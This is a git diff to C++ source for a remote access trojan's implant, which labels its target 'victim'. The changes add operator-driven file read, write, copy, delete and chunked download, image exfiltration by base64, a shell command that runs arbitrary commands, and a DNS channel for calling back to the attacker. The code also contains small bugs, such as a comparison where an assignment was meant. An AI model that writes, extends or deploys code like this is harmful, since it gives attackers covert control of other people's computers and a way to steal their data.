@@ -12,6 +12,7 @@ Author: ISSAC
 #include <sstream>
 #include <vector>
 #include <tuple>
+#include <thread>
 
 #include <arpa/inet.h>
 
@@ -122,31 +123,122 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
         }
         else if (vsMsg[1] == "wf")
         {
+            std::string szFilePath = vsMsg[2];
+            std::string szFileContent = vsMsg[3];
 
+            RETMSG msg = fileMgr.fntpWriteFile(szFilePath, szFileContent);
+            auto [nCode, szPath] = msg;
+
+            STRLIST ls = {
+                "file",
+                "wf",
+                std::to_string(nCode),
+                szPath,
+            };
+
+            victim.fnSendCommand(ls);
         }
         else if (vsMsg[1] == "rf")
         {
+            std::string szFilePath = vsMsg[2];
 
+            RETMSG msg = fileMgr.fntpReadFile(szFilePath);
+            auto [nCode, szContent] = msg;
+
+            STRLIST ls = {
+                "file",
+                "rf",
+                std::to_string(nCode),
+                szFilePath,
+                szContent,
+            };
+
+            victim.fnSendCommand(ls);
+        }
+        else if (vsMsg[1] == "goto")
+        {
+            std::string szPath = vsMsg[2];
+            bool bExist = fileMgr.fnbDirExists(szPath);
+            int nCode = (int)bExist;
+
+            STRLIST ls = {
+                "file",
+                "goto",
+                std::to_string(nCode),
+                szPath,
+            };
+
+            victim.fnSendCommand(ls);
         }
         else if (vsMsg[1] == "df")
         {
+            std::string szFilePath = vsMsg[2];
+            size_t nChunk = atoi(vsMsg[3].data());
 
+            std::thread thDownload(
+                [&fileMgr, &victim, &szFilePath, nChunk]() 
+                {
+                    fileMgr.fnDownloadFile(victim, szFilePath, nChunk);
+                }
+            );
+
+            thDownload.join();
         }
         else if (vsMsg[1] == "uf")
         {
 
         }
-        else if (vsMsg[1] == "del")
+        else if (vsMsg[1] == "wget")
         {
 
         }
+        else if (vsMsg[1] == "del")
+        {
+            STR szPath = vsMsg[2];
+            auto[nCode, szMsg] = fileMgr.fntpDelete(szPath);
+
+            STRLIST ls = {
+                std::to_string(nCode),
+                szPath,
+                szMsg,
+            };
+
+            victim.fnSendCommand(ls);
+        }
         else if (vsMsg[1] == "cp")
         {
+            STR szSrcPath = vsMsg[2];
+            STR szDstPath = vsMsg[3];
 
+            auto[nCode, szMsg] = fileMgr.fntpCopy(szSrcPath, szDstPath);
+
+            STRLIST ls = {
+                std::to_string(nCode),
+                szSrcPath,
+                szDstPath,
+                szMsg,
+            };
+
+            victim.fnSendCommand(ls);
         }
         else if (vsMsg[1] == "mv")
         {
 
+        }
+        else if (vsMsg[1] == "img")
+        {
+            std::string szFilePath = vsMsg[2];
+            BUFFER abBuffer = fileMgr.fnabReadImage(szFilePath);
+            std::string szb64Img = clsEZData::fnb64Encode(abBuffer);
+
+            STRLIST ls = {
+                "file",
+                "img",
+                szFilePath,
+                szb64Img,
+            };
+
+            victim.fnSendCommand(ls);
         }
     }
     else if (vsMsg[0] == "proc")
@@ -168,7 +260,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
             auto services = srvMgr.fnGetServices();
             for (auto& s : services)
             {
-                std::vector<std::string> vsSrv = {
+                STRLIST vsSrv = {
                     s.szName,
                     s.szDescription,
                     s.szLoadState,
@@ -189,6 +281,25 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
 
             victim.fnSendCommand(vsMsg);
         }
+    }
+    else if (vsMsg[0] == "shell")
+    {
+        if (vsMsg[1] == "start")
+        {
+
+        }
+        else if (vsMsg[1] == "stop")
+        {
+
+        }
+        else if (vsMsg[1] == "exec")
+        {
+            std::string szOutput = clsTools::fnExec(vsMsg[2]);
+        }
+    }
+    else if (vsMsg[0] == "loader")
+    {
+
     }
 }
 
@@ -340,6 +451,8 @@ void fnHttpHandler(int sktSrv)
         
         auto[nCommand, nParam, nLength, vuMsg] = edp.fnGetMsg();
         std::string szMsg(vuMsg.begin(), vuMsg.end());
+
+        clsTools::fnLogOK(szMsg);
 
         if (nCommand == 0)
         {
@@ -574,10 +687,9 @@ int main(int argc, char *argv[])
                 enMethod = enConnectionMethod::HTTP;
             else if (method == "DNS")
                 enMethod = enConnectionMethod::DNS;
+            else
+                enMethod == enConnectionMethod::TLS;
         }
-
-        if (enMethod == NULL)
-            enMethod = enConnectionMethod::TCP;
     }
 
     while (true)
@@ -594,7 +706,7 @@ int main(int argc, char *argv[])
                 fnHttpConnect(g_szIP, g_nPort);
                 break;
             case enConnectionMethod::DNS:
-
+                fnDnsConnect(g_szIP, g_nPort);
                 break;
             default:
                 fnTcpConnect(g_szIP, g_nPort);
